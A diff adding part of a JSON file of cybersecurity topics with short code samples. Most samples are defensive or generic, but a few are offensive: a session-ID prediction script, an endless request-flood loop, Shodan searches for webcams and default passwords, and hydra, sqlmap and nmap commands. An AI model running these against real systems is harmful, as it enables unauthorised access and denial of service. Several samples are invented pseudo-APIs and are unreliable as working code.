+            "code": "TRACE / HTTP/1.1\nHost: vulnerable.site\nCookie: sessionid=..."
+          }
+        ]
+      },
+      {
+        "topic": "Cryptanalysis",
+        "code_samples": [
+          {
+            "description": "simple frequency analysis in cryptanalysis",
+            "code": "def frequency_analysis(ciphertext):\n  frequency = {}\n  for letter in ciphertext:\n\tif letter in frequency:\n\t  frequency[letter] += 1\n\telse:\n\t  frequency[letter] = 1\n  return frequency"
+          },
+          {
+            "description": "Example of using the Caesar cipher for encryption",
+            "code": "def caesar_encrypt(plaintext, shift):\n  encrypted = ''\n  for char in plaintext:\n\tif char.isalpha():\n\t  offset = 65 if char.isupper() else 97\n\t  encrypted += chr((ord(char) + shift - offset) % 26 + offset)\n\telse:\n\t  encrypted += char\n  return encrypted"
+          },
+          {
+            "description": "Example of using the Vigenère cipher for encryption",
+            "code": "def vigenere_encrypt(plaintext, key):\n  encrypted = ''\n  key_length = len(key)\n  for i, char in enumerate(plaintext):\n\tif char.isalpha():\n\t  offset = 65 if char.isupper() else 97\n\t  key_char = key[i % key_length].upper() if char.isupper() else key[i % key_length].lower()\n\t  encrypted += chr((ord(char) + ord(key_char) - 2 * offset) % 26 + offset)\n\telse:\n\t  encrypted += char\n  return encrypted"
+          }
+        ]
+      },
+      {
+        "topic": "Session Prediction",
+        "code_samples": [
+          {
+            "description": "Example of predicting session IDs",
+            "code": "import requests\n\nsession_id = 'known_session_id'\nnext_session_id = str(int(session_id) + 1)\nresponse = requests.get('https://vulnerable.site/session', cookies={'sessionid': next_session_id})\nif response.status_code == 200:\n  print('Successfully predicted the next session ID')"
+          }
+        ]
+      },
+      {
+        "topic": "Traffic Flood",
+        "code_samples": [
+          {
+            "description": "traffic flood attack",
+            "code": "import requests\n\nwhile True:\n  requests.get('https://vulnerable.site')"
+          }
+        ]
+      },
+      {
+        "topic": "Unicode Encoding",
+        "code_samples": [
+          {
+            "description": "Example of unicode encoding for internationalization support",
+            "code": "text = 'Hello, World!'\nencoded_text = text.encode('utf-8')\nprint(encoded_text)"
+          },
+          {
+            "description": "Example of decoding unicode to support text rendering",
+            "code": "encoded_text = b'Hello, World!'\ndecoded_text = encoded_text.decode('utf-8')\nprint(decoded_text)"
+          },
+          {
+            "description": "Example of using unicode encoding in HTML",
+            "code": "html_content = 'Currency Symbol: €'\nprint(html_content)"
+          }
+        ]
+      },
+      {
+        "topic": "Burp Suite",
+        "code_samples": [
+          {
+            "description": "Example of using Burp Suite to intercept and modify HTTP requests",
+            "code": "1. Open Burp Suite\n2. Go to 'Proxy' tab and turn on 'Intercept'\n3. Configure your browser to use Burp as its proxy\n4. Browse to a website, and intercepted requests will appear in Burp"
+          },
+          {
+            "description": "Example of using Burp Suite for scanning web applications",
+            "code": "1. Open Burp Suite\n2. Set up target scope\n3. Run 'Active Scan' on the target\n4. Review the results for potential vulnerabilities"
+          },
+          {
+            "description": "Example of using Burp Suite Repeater to test for vulnerabilities",
+            "code": "1. Capture a request with Burp Proxy\n2. Send to Repeater\n3. Modify the request parameters\n4. Send the modified request and analyze the response"
+          }
+        ]
+      },
+      {
+        "topic": "OWASP",
+        "code_samples": [
+          {
+            "description": "Example of implementing OWASP Top 10 security practices",
+            "code": "1. Validate all inputs to prevent injection attacks\n2. Store and transmit data securely to protect against data breaches\n3. Implement authentication and access control measures"
+          },
+          {
+            "description": "Example of securing applications against XSS attacks",
+            "code": "1. Sanitize user input\n2. Use secure frameworks that automatically escape XSS\n3. Implement Content Security Policy"
+          },
+          {
+            "description": "Example of protecting against insecure deserialization",
+            "code": "1. Avoid serialization of sensitive data\n2. Implement integrity checks\n3. Use serialization mediums that allow for type constraints"
+          }
+        ]
+      },
+      {
+        "topic": "OSINT",
+        "code_samples": [
+          {
+            "description": "Example of gathering open-source intelligence using Python",
+            "code": "import requests\n\nresponse = requests.get('https://api.github.com/users/username/events/public')\npublic_events = response.json()\nfor event in public_events:\n  print(event)"
+          },
+          {
+            "description": "Example of using Twitter API for OSINT",
+            "code": "import tweepy\n\napi = tweepy.API(auth)\npublic_tweets = api.home_timeline()\nfor tweet in public_tweets:\n  print(tweet.text)"
+          },
+          {
+            "description": "Example of using Whois for domain OSINT",
+            "code": "import whois\n\ndomain_info = whois.whois('example.com')\nprint(domain_info)"
+          }
+        ]
+      },
+      {
+        "topic": "Shodan",
+        "code_samples": [
+          {
+            "description": "Example of using Shodan API to find devices connected to the internet",
+            "code": "from shodan import Shodan\n\napi = Shodan('YOUR_API_KEY')\nresult = api.search('webcam')\nprint(result)"
+          },
+          {
+            "description": "Example of using Shodan to monitor network security",
+            "code": "api = Shodan('YOUR_API_KEY')\nalert = api.create_alert(name='Network Alert', ip='198.51.100.0/24')\nprint(alert)"
+          },
+          {
+            "description": "Example of using Shodan to find vulnerable systems",
+            "code": "result = api.search('default password')\nfor service in result['matches']:\n  print(service['ip_str'], service['port'])"
+          }
+        ]
+      },
+      {
+        "topic": "Maltego",
+        "code_samples": [
+          {
+            "description": "Example of using Maltego for digital forensics and information gathering",
+            "code": "1. Open Maltego\n2. Choose a machine like 'Company Stalker'\n3. Enter the domain of the target company\n4. Run the machine to gather information"
+          },
+          {
+            "description": "Example of using Maltego for social network analysis",
+            "code": "1. Open Maltego\n2. Choose 'Social Links'\n3. Enter the username of the individual\n4. Run the machine to analyze connections"
+          },
+          {
+            "description": "Example of using Maltego for mapping network infrastructure",
+            "code": "1. Open Maltego\n2. Choose 'Footprint L3'\n3. Enter the IP range of the network\n4. Run the machine to map the network"
+          }
+        ]
+      },
+      {
+        "topic": "Binary Planting",
+        "code_samples": [
+          {
+            "description": "Example of protecting against binary planting",
+            "code": "if (!PathIsSafe(userInput)) {\n  // Do not execute the binary\n}"
+          },
+          {
+            "description": "Example of validating file sources",
+            "code": "if (IsTrustedSource(fileSource)) {\n  // Proceed with execution\n}"
+          },
+          {
+            "description": "Example of user input sanitization for file execution",
+            "code": "filePath = SanitizeInput(userFilePath);\nExecuteBinary(filePath);"
+          }
+        ]
+      },
+      {
+        "topic": "Security Policies",
+        "code_samples": [
+          {
+            "description": "basic security policy for password management",
+            "code": "PasswordPolicy:\n  MinimumLength: 8\n  RequireNumbers: true\n  RequireSpecialCharacters: true\n  PasswordExpirationDays: 90"
+          },
+          {
+            "description": "security policy for data encryption",
+            "code": "DataEncryptionPolicy:\n  EncryptionStandard: 'AES-256'\n  KeyManagement: 'Use HSM for key storage'"
+          },
+          {
+            "description": "security policy for remote access",
+            "code": "RemoteAccessPolicy:\n  VPNRequired: true\n  MultiFactorAuthenticationRequired: true"
+          }
+        ]
+      },
+      {
+        "topic": "Security Audits",
+        "code_samples": [
+          {
+            "description": "security audit checklist item",
+            "code": "ChecklistItem:\n  Description: 'Ensure all servers are running the latest security patches'\n  Status: 'Pending'"
+          },
+          {
+            "description": "network security audit checklist item",
+            "code": "ChecklistItem:\n  Description: 'Verify firewall configurations and rule sets'\n  Status: 'In Progress'"
+          },
+          {
+            "description": "application security audit checklist item",
+            "code": "ChecklistItem:\n  Description: 'Review application code for security vulnerabilities'\n  Status: 'Completed'"
+          }
+        ]
+      },
+      {
+        "topic": "Security Training",
+        "code_samples": [
+          {
+            "description": "security awareness training module outline",
+            "code": "Module: 'Phishing Awareness'\n  Lesson 1: 'Identifying Phishing Emails'\n  Lesson 2: 'What To Do If You Suspect Phishing'"
+          },
+          {
+            "description": "cybersecurity best practices training module",
+            "code": "Module: 'Cybersecurity Best Practices'\n  Lesson 1: 'Creating Strong Passwords'\n  Lesson 2: 'Securing Personal Devices'"
+          },
+          {
+            "description": "incident reporting training module",
+            "code": "Module: 'Incident Reporting'\n  Lesson 1: 'How to Report Security Incidents'\n  Lesson 2: 'The Importance of Timely Reporting'"
+          }
+        ]
+      },
+      {
+        "topic": "Cloud Security",
+        "code_samples": [
+          {
+            "description": "Example of securing cloud storage with encryption",
+            "code": "cloudStorage.encryptData(data, encryptionKey)"
+          },
+          {
+            "description": "Example of setting up secure cloud network configurations",
+            "code": "cloudNetwork.configureSecurity('VPC peering', 'Private subnets')"
+          },
+          {
+            "description": "Example of implementing identity and access management in the cloud",
+            "code": "cloudIAM.setup('Multi-factor Authentication', 'Role-based Access Control')"
+          }
+        ]
+      },
+      {
+        "topic": "Threat Intelligence",
+        "code_samples": [
+          {
+            "description": "Example of using threat intelligence feeds",
+            "code": "threatFeed.subscribe('https://threatfeed.example.com')\nalerts = threatFeed.getAlerts()\nfor alert in alerts:\n  investigate(alert)"
+          },
+          {
+            "description": "Example of integrating threat intelligence into security devices",
+            "code": "securityDevice.integrateThreatIntelligence('Firewall', 'IDS/IPS')"
+          },
+          {
+            "description": "Example of analyzing threat intelligence data",
+            "code": "threatData.analyze('Pattern Recognition', 'Behavioral Analysis')"
+          }
+        ]
+      },
+      {
+        "topic": "Incident Response",
+        "code_samples": [
+          {
+            "description": "incident response plan step",
+            "code": "IncidentResponsePlan:\n  Step 1: 'Identify the breach'\n  Step 2: 'Contain the threat'\n  Step 3: 'Eradicate the root cause'"
+          },
+          {
+            "description": "Example of incident documentation",
+            "code": "IncidentDocumentation:\n  'Document all actions taken during incident response for post-incident analysis'"
+          },
+          {
+            "description": "Example of communication during an incident",
+            "code": "IncidentCommunication:\n  'Notify all relevant stakeholders and provide regular updates on incident status'"
+          },
+          {
+            "description": "Example of recovery procedures",
+            "code": "RecoveryProcedures:\n  'Restore systems from backups and test to ensure normal operations'"
+          },
+          {
+            "description": "Example of lessons learned",
+            "code": "LessonsLearned:\n  'Conduct a debrief to discuss what went well and what could be improved'"
+          }
+        ]
+      },
+      {
+        "topic": "SIEM",
+        "code_samples": [
+          {
+            "description": "Example of configuring SIEM rules",
+            "code": "siem.createRule('Failed Login Attempt', 'alert when a user fails to login more than 5 times in 1 minute')"
+          },
+          {
+            "description": "Example of setting up SIEM notification",
+            "code": "siem.setupNotification('Suspicious Activity', 'send email to admin@example.com when suspicious activity is detected')"
+          },
+          {
+            "description": "Example of creating SIEM dashboard widgets",
+            "code": "siem.createDashboard('Security Posture', 'display real-time threat analysis and system vulnerabilities')"
+          },
+          {
+            "description": "Example of integrating SIEM with threat intelligence",
+            "code": "siem.integrateThreatIntelligence('Threat Feeds', 'use external threat feeds to enhance detection capabilities')"
+          },
+          {
+            "description": "Example of automating SIEM responses",
+            "code": "siem.automateResponse('Malware Detection', 'isolate infected system and initiate antivirus scan')"
+          }
+        ]
+      },
+      {
+        "topic": "Ethical Hacking",
+        "code_samples": [
+          {
+            "description": "ethical hacking engagement agreement clause",
+            "code": "AgreementClause:\n  'The ethical hacker agrees to maintain confidentiality and to only test systems for which explicit permission has been granted.'"
+          },
+          {
+            "description": "ethical hacking test plan",
+            "code": "TestPlan:\n  'Define the scope of the test, including systems to be tested and testing methods to be used.'"
+          },
+          {
+            "description": "ethical hacking reporting template",
+            "code": "ReportTemplate:\n  'Document findings, provide evidence of testing, and recommend remediation steps.'"
+          },
+          {
+            "description": "ethical hacking risk assessment",
+            "code": "RiskAssessment:\n  'Identify potential risks associated with the systems being tested and prioritize them based on impact and likelihood.'"
+          },
+          {
+            "description": "ethical hacking tools list",
+            "code": "ToolsList:\n  'Enumerate the tools and techniques that will be used during the testing, such as port scanners, vulnerability scanners, and exploitation frameworks.'"
+          }
+        ]
+      },
+      {
+        "topic": "Penetration Testing",
+        "code_samples": [
+          {
+            "description": "penetration testing command",
+            "code": "nmap -sV -p 1-65535 -T4 -A -v target_ip"
+          },
+          {
+            "description": "vulnerability scanning command",
+            "code": "nikto -h target_ip"
+          },
+          {
+            "description": "password cracking command",
+            "code": "hydra -l user -P password_list.txt target_ip ssh"
+          },
+          {
+            "description": "network sniffing command",
+            "code": "tcpdump -i eth0 'port 80'"
+          },
+          {
+            "description": "web application attack simulation",
+            "code": "sqlmap -u 'http://example.com/vuln.php?id=1' --risk=3 --level=5"
+          }
+        ]
+      },
+      {
+        "topic": "Secure Software Development Lifecycle",
+        "code_samples": [
+          {
+            "description": "Example of integrating security into the SDLC",
+            "code": "SDLC_Phases:\n  - Requirements: 'Include security requirements'\n  - Design: 'Conduct threat modeling'\n  - Implementation: 'Use secure coding practices'"
+          },
+          {
+            "description": "Example of security review in the SDLC",
+            "code": "SDLC_Phases:\n  - Testing: 'Perform security testing'\n  - Deployment: 'Review deployment for security issues'\n  - Maintenance: 'Regularly update security patches'"
+          },
+          {
+            "description": "Example of security training for SDLC",
+            "code": "SDLC_Phases:\n  - Training: 'Provide security training for developers'\n  - Documentation: 'Create security-focused documentation'\n  - Response: 'Develop incident response plans'"
+          }
+        ]
+      },
+      {
+        "topic": "DevSecOps",
+        "code_samples": [
+          {
+            "description": "DevSecOps pipeline step for static code analysis",
+            "code": "pipeline.addStep('Static Code Analysis', tools=['SonarQube', 'Fortify'])"
+          },
+          {
+            "description": "DevSecOps pipeline step for dynamic analysis",
+            "code": "pipeline.addStep('Dynamic Analysis', tools=['OWASP ZAP', 'IBM AppScan'])"
+          },
+          {
+            "description": "DevSecOps pipeline step for dependency scanning",
+            "code": "pipeline.addStep('Dependency Scanning', tools=['Snyk', 'WhiteSource'])"
+          },
+          {
+            "description": "DevSecOps pipeline step for container security",
+            "code": "pipeline.addStep('Container Security', tools=['Aqua Security', 'Twistlock'])"
+          },
+          {
+            "description": "DevSecOps pipeline step for compliance monitoring",
+            "code": "pipeline.addStep('Compliance Monitoring', tools=['Chef InSpec', 'Puppet Compliance'])"
+          }
+        ]
+      },      
+      {
+        "topic": "Operating System Security",
+        "code_samples": [
+          {
+            "description": "Example of hardening an operating system",
+            "code": "os.harden('disable_unused_services', 'install_security_updates')"
+          },
+          {
+            "description": "Example of securing user accounts",
+            "code": "os.secure_accounts('enforce_password_policy', 'setup_two_factor_authentication')"
+          },
+          {
+            "description": "Example of enhancing network security",
+            "code": "os.enhance_network_security('enable_firewall', 'disable_insecure_protocols')"
+          },
+          {
+            "description": "Example of configuring firewall rules",
+            "code": "os.configure_firewall_rules('block_incoming_traffic', 'allow_outgoing_traffic')"
+          },
+          {
+            "description": "Example of monitoring security logs",
+            "code": "os.monitor_security_logs('audit_failed_logins', 'alert_on_suspicious_activities')"
+          }
+        ]
+      },      
+      {
+        "topic": "CIA Triad",
+        "code_samples": [
+          {
+            "description": "Example of implementing the CIA Triad principles",
+            "code": "SecurityMeasures:\n  Confidentiality: 'Encrypt sensitive data'\n  Integrity: 'Use checksums and digital signatures'\n  Availability: 'Implement failover and redundancy'"
+          },
+          {
+            "description": "Example of ensuring data confidentiality",
+            "code": "DataConfidentiality:\n  'Use end-to-end encryption for data in transit'\n  'Apply role-based access control'"
+          },
+          {
+            "description": "Example of maintaining data integrity",
+            "code": "DataIntegrity:\n  'Regularly audit data for unauthorized changes'\n  'Implement version control systems'"
+          }
+        ]
+      },
+      {
+        "topic": "Risk Management",
+        "code_samples": [
+          {
+            "description": "risk assessment matrix",
+            "code": "RiskMatrix:\n  - Risk: 'Data Breach'\n\tLikelihood: 'High'\n\tImpact: 'Severe'\n\tMitigation: 'Implement strong encryption and access controls'"
+          },
+          {
+            "description": "risk mitigation strategy",
+            "code": "RiskMitigation:\n  - Risk: 'Phishing Attacks'\n\tStrategy: 'Conduct regular security awareness training'"
+          },
+          {
+            "description": "risk monitoring process",
+            "code": "RiskMonitoring:\n  'Continuously monitor security logs and alerts for potential threats'"
+          }
+        ]
+      },
+      {
+        "topic": "Secure Coding",
+        "code_samples": [
+          {
+            "description": "Example of secure coding practices",
+            "code": "SecureCodingPractices:\n  - 'Validate all inputs'\n  - 'Sanitize data before using in SQL queries'\n  - 'Store passwords using strong hashing algorithms'"
+          },
+          {
+            "description": "Example of preventing buffer overflow",
+            "code": "BufferOverflowPrevention:\n  'Use bounds checking for array and string operations'"
+          },
+          {
+            "description": "Example of secure session management",
+            "code": "SessionManagement:\n  'Generate unique session tokens'\n  'Implement session expiration'"
+          }
+        ]
+      }
+      
+      
+]
+  
